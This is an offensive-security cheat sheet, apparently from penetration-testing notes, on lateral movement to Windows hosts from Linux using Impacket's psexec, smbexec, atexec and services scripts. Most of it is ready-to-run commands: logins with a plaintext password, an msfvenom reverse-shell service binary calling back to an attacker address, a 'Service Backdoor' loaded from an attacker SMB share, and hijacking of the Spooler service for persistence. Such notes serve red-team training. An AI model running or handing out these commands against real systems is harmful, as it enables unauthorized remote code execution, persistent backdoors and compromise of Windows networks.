# 05.04 Impacket SMB Execution Linux

> Pick `psexec.py`, `smbexec.py`, `atexec.py`, or `services.py` based on noise tolerance — hijack existing services for stealth.

## Overview

Impacket provides four SMB-based execution scripts from Linux: psexec.py (uploads a binary to ADMIN$, creates a random service — noisiest), smbexec.py (service on-the-fly, no binary upload, semi-interactive), atexec.py (task scheduler via atsvc pipe), and services.py/impacket-services for full service lifecycle management. Each has a distinct noise and detection profile; service hijacking via services.py can impersonate an existing service account.

## Steps

- `psexec.py` — writes executable to ADMIN$; creates named pipe for I/O; leaves artefacts on disk.
- `smbexec.py` — no binary upload; uses existing SMB pipes; semi-interactive shell.
- `atexec.py` — schedules task via atsvc, runs at next minute boundary; clocks must be synchronised.
- `services.py list` — enumerate all services on target.
- `services.py create` — deploy a new service pointing to SMB-hosted `exe-service` msfvenom payload.
- `services.py change` — hijack an existing service (e.g., Spooler) to redirect binary path.
- `services.py delete` — clean up after execution.
- Use `msfvenom -f exe-service` to produce a service-compatible reverse shell binary.

## Commands

### psexec.py

```bash
proxychains4 -q psexec.py <DOMAIN>/helen:'RedRiot88'@172.20.0.52
```

### smbexec.py

```bash
proxychains4 -q smbexec.py <DOMAIN>/helen:'RedRiot88'@172.20.0.52
```

### atexec.py

```bash
proxychains4 -q atexec.py <DOMAIN>/helen:'RedRiot88'@172.20.0.52 "powershell -e BASE64"
```

### msfvenom exe-service payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.207 LPORT=9001 -f exe-service -o rshell-9001s.exe
```

### services.py list

```bash
proxychains4 -q services.py <DOMAIN>/helen:'RedRiot88'@172.20.0.52 list
```

### services.py create new service

```bash
proxychains4 -q services.py <DOMAIN>/helen:'RedRiot88'@172.20.0.52 create -name 'Service Backdoor' -display 'Service Backdoor' -path "\\\\10.10.14.207\\share\\rshell-9001.exe"
```

### impacket-services start

```bash
proxychains4 -q impacket-services <DOMAIN>/helen:'RedRiot88'@172.20.0.52 start -name 'Service Backdoor'
```

### services.py delete

```bash
proxychains4 -q services.py <DOMAIN>/helen:'RedRiot88'@172.20.0.52 delete -name 'Service Backdoor'
```

### impacket-services config (inspect Spooler)

```bash
proxychains4 -q impacket-services <DOMAIN>/helen:'RedRiot88'@172.20.0.52 config -name Spooler
```

### impacket-services change (hijack Spooler)

```bash
proxychains4 -q impacket-services <DOMAIN>/helen:'RedRiot88'@172.20.0.52 change -name Spooler -path "\\\\10.10.14.207\\share\\rshell-9001.exe" -start_type 2
```
